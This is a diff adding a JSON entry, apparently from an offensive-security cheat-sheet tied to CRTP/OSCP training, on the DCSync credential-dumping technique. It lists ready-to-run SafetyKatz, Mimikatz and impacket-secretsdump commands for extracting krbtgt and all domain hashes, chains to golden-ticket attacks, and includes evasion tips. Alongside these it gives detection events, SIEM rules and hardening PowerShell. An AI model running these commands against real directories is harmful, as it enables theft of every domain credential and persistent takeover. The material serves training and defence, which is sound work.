@@ -1,0 +1,119 @@
+{
+  "id": "crtp-dcsync",
+  "name": "DCSync (SafetyKatz / impacket-secretsdump)",
+  "command": "SafetyKatz.exe \"lsadump::dcsync /user:<domain>\\krbtgt\" \"exit\"",
+  "description": "Simulate a Domain Controller replication to extract password hashes for any domain account without touching LSASS. Requires Replicating Directory Changes rights.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Lateral Movement",
+  "type": "command",
+  "certifications": [
+    "CRTP",
+    "CPTS",
+    "OSCP"
+  ],
+  "source": "CRTP",
+  "opsec": "moderate",
+  "mitre": [
+    "T1003.006"
+  ],
+  "tools": [
+    "SafetyKatz"
+  ],
+  "tags": [
+    "dcsync",
+    "krbtgt",
+    "domain-admin",
+    "mimikatz",
+    "replication",
+    "secretsdump"
+  ],
+  "steps": [
+    {
+      "label": "DCSync for krbtgt hash",
+      "command": "SafetyKatz.exe \"lsadump::dcsync /user:<domain>\\krbtgt\" \"exit\""
+    },
+    {
+      "label": "DCSync for specific user",
+      "command": "SafetyKatz.exe \"lsadump::dcsync /user:<domain>\\<user>\" \"exit\""
+    },
+    {
+      "label": "DCSync all hashes to CSV",
+      "command": "SafetyKatz.exe \"lsadump::dcsync /all /csv\" \"exit\""
+    },
+    {
+      "label": "From Linux with secretsdump",
+      "command": "impacket-secretsdump <domain>/<user>:'<password>'@<dc_ip> -just-dc"
+    }
+  ],
+  "examples": [
+    {
+      "label": "DCSync for krbtgt (Windows)",
+      "command": "SafetyKatz.exe \"lsadump::dcsync /user:corp\\krbtgt\" \"exit\""
+    },
+    {
+      "label": "DCSync for Administrator",
+      "command": "SafetyKatz.exe \"lsadump::dcsync /user:corp\\Administrator\" \"exit\""
+    },
+    {
+      "label": "From Linux with impacket",
+      "command": "impacket-secretsdump corp.local/Administrator:'Password123'@10.10.10.10 -just-dc"
+    },
+    {
+      "label": "All hashes via mimikatz",
+      "command": "Invoke-Mimikatz -Command '\"lsadump::dcsync /all /csv\"'"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-golden-ticket",
+      "note": "Use krbtgt hash to forge golden ticket",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-silver-ticket",
+      "note": "Use service account hash for silver ticket",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-overpass-hash",
+      "note": "Use dumped hash for Kerberos TGT",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-child-to-parent",
+      "note": "Use child krbtgt for cross-domain escalation",
+      "rel": "next"
+    }
+  ],
+  "notes": "Requires DA, Domain Replicator, or Replicating Directory Changes + All. Logged on DC as DS-Replication-Get-Changes event.",
+  "references": [
+    {
+      "title": "CRTP - DCSync",
+      "url": "https://www.alteredsecurity.com/adlab"
+    },
+    {
+      "title": "HackTricks - DCSync",
+      "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Domain Controllers synchronize directory data using the MS-DRSR (Directory Replication Service Remote) protocol. Any principal with Replicating Directory Changes + Replicating Directory Changes All rights on the domain object can invoke IDL_DRSGetNCChanges to pull password hashes — the krbtgt hash, all user NTLM hashes, and Kerberos keys. This doesn't require code on the DC; it's a legitimate AD protocol abused remotely.",
+    "prerequisites": "An account with DCSync rights: Domain Admins, Enterprise Admins, Administrators, or explicitly granted Replicating Directory Changes + Replicating Directory Changes All on the domain NC. SafetyKatz /patch or impacket-secretsdump. Network access to DC on RPC/LDAP.",
+    "impact": "T1003.006 OS Credential Dumping: DCSync. Extracts ALL domain credentials: every user's NTLM hash, Kerberos keys, and the krbtgt hash. krbtgt hash enables Golden Ticket creation — indefinite domain persistence regardless of password changes.",
+    "detection": "Event 4662 on the domain NC object with access mask 0x100 (Control Access) and properties 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes) and 1131f6ab-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All) from a non-DC account. MDI 'DCSync attack' alert (highest confidence). Netflow: RPC to DC on port 135/49xxx from a workstation.\nProcesses accessing LSASS memory or SAM registry hives outside of trusted security tools, often followed by file creation or lateral movement (DET0234/AN0648).\nProcesses opening /proc/*/mem or /proc/*/maps targeting credential-storing services like sshd or login; high privilege escalation and memory inspection tools such as gcore or gdb (AN0649).\nUnsigned processes accessing system memory or launching known credential scraping tools (e.g., osascript, dylib injections) to access the Keychain or sensitive memory regions (AN0650).",
+    "artifacts": "Event 4662 on domain NC with DCSync-specific GUIDs from non-DC source | MDI alert: 'DCSync attack (replication of directory services)' | netflow: RPC endpoint mapper (135) + dynamic RPC from workstation to DC | SIEM correlation: replication rights access from non-DC",
+    "prevention": "Restrict DCSync rights: audit and remove Replicating Directory Changes rights from non-DA accounts. Enable AD auditing (DS Access → Audit Directory Service Access). MDI deployment — detects DCSync with very high fidelity. Tier the accounts that have DA rights. Alert on Event 4662 with DCSync GUIDs from non-DC source (SIEM rule).\nActive Directory Configuration: Manage ACL for 'Replicating Directory Changes All'; add users to Protected Users security group to limit cached plaintext credentials.\nBehavior Prevention on Endpoint: Enable Windows 10 ASR rules to secure LSASS and prevent credential stealing.\nCredential Access Protection: Enable Credential Guard (Windows 10+) to protect LSA secrets; enable Protected Process Light for LSA on Server 2012 R2.\nEncrypt Sensitive Information: Ensure Domain Controller backups are properly secured.\nOperating System Configuration: Disable or restrict NTLM; disable WDigest authentication.\nPassword Policies: Ensure local administrator accounts have complex, unique passwords across all systems.\nPrivileged Account Management: Do not place domain accounts in local admin groups across systems; limit cross-tier admin use; on Linux restrict root access to prevent memory scraping.",
+    "evasion": "Compromise an existing DC machine account (same rights, legitimate source). Use an AD connector account that legitimately has replication rights. Perform DCSync at low volume (single account at a time) to avoid bulk-pull signatures.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1003/006/"
+    ],
+    "misconfiguration": "Non-DC accounts granted Replicating Directory Changes rights (often from legacy AD sync tools, Azure AD Connect, or misconfigured delegation). No audit on DCSync-specific ACL modifications. MDI not deployed.",
+    "vulnerable_config": "# Check who has DCSync rights (non-DCs):\n(Get-ObjectAcl 'DC=corp,DC=local' -ResolveGUIDs | Where-Object {\n  $_.ObjectAceType -match 'DS-Replication-Get-Changes' -and\n  $_.IdentityReference -notmatch 'Domain Controllers'\n}) | Select-Object IdentityReference, ObjectAceType\n# Any non-DC account listed = DCSync capable\n\n# Azure AD Connect account often has DCSync rights by design:\n# MSOL_* account — if compromised, instant DCSync",
+    "secure_config": "# Audit DCSync rights quarterly:\nGet-ObjectAcl 'DC=corp,DC=local' -ResolveGUIDs | Where-Object {\n  $_.ObjectAceType -match 'DS-Replication-Get-Changes' -and\n  $_.IdentityReference -notmatch 'Enterprise Domain Controllers'\n} | ForEach-Object { Write-Warning \"Non-DC DCSync right: $($_.IdentityReference)\" }\n\n# Remove unexpected DCSync rights:\n$path = 'AD:\\DC=corp,DC=local'\n$acl = Get-Acl -Path $path\n$ace = $acl.Access | Where-Object { $_.IdentityReference -eq 'CORP\\BadAccount' -and $_.ObjectType -match '1131f6aa' }\n$acl.RemoveAccessRule($ace)\nSet-Acl -Path $path -AclObject $acl\n\n# Enable DCSync detection in SIEM:\n# EventID=4662 AND ObjectType='19195a5b-6da0-11d0-afd3-00c04fd930c9' AND\n# Properties contains '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' AND\n# SubjectUserName NOT IN (domain controller machine accounts) → CRITICAL ALERT\n\n# MDI automatically alerts on DCSync from non-DC accounts"
+  }
+}
